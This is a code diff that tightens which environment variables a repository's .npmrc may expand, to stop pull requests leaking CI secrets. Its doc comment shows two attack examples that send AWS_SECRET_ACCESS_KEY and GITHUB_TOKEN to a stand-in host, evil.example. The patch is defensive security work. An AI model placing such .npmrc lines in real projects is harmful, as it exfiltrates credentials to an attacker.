@@ -44,17 +44,24 @@ const KNOWN_REGISTRY_HOSTS = new Set([
   "npm.pkg.github.com",
   "registry.yarnpkg.com",
 ]);
-const NPM_SPECIFIC_ENV = /^(?:NPM|NODE_AUTH|YARN|PNPM|BUN)|NPM_(?:TOKEN|AUTH)|REGISTRY/i;
+const NPM_SPECIFIC_ENV =
+  /^(?:NPM_TOKEN|NODE_AUTH_TOKEN|NPM_CONFIG_.+|YARN_NPM_.+|PNPM_.*TOKEN|BUN_AUTH_TOKEN)$/i;
+
+/** `NPM_CONFIG_*` settings that are not credentials: usable in a registry URL. */
+const NPM_CONFIG_VALUE_ENV = /^NPM_CONFIG_(?!.*(?:TOKEN|AUTH|PASS|SECRET|KEY)).+$/i;
 
 /**
- * Whether a project-level `.npmrc` may put `${name}` into the credential `key`. A repository controls
- * that file, so a pull request could name its own registry and a credential that expands to an
- * ambient secret (`GITHUB_TOKEN`) to have it sent there. Variables made for npm, and the public
- * registry hosts, are fine; anything else is dropped.
+ * Whether a project-level `.npmrc` may put `${name}` into `key`. A repository controls that file,
+ * so a pull request could use it to have an ambient secret sent somewhere it picks:
+ * `registry=https://evil.example/${AWS_SECRET_ACCESS_KEY}` puts it in every request path, and
+ * `//evil.example/:_authToken=${GITHUB_TOKEN}` in an Authorization header. So:
+ * - other keys (`registry`, proxies) expand only `NPM_CONFIG_*` settings, never a token or secret,
+ * - a credential may name a variable made for npm (anchored, so `BUNDLE_*` or `DOCKER_REGISTRY_*`
+ *   do not count), or any variable when the host is a public registry.
  */
 export function projectEnvCredentialAllowed(key: string, name: string): boolean {
   const credential = /^\/\/([^/]+)\/.*:(?:_authToken|_auth|_password|username)$/.exec(key);
-  if (!credential) return true; // not a credential key: nothing secret is being attached
+  if (!credential) return NPM_CONFIG_VALUE_ENV.test(name);
   if (NPM_SPECIFIC_ENV.test(name)) return true;
   return KNOWN_REGISTRY_HOSTS.has(credential[1] ?? "");
 }
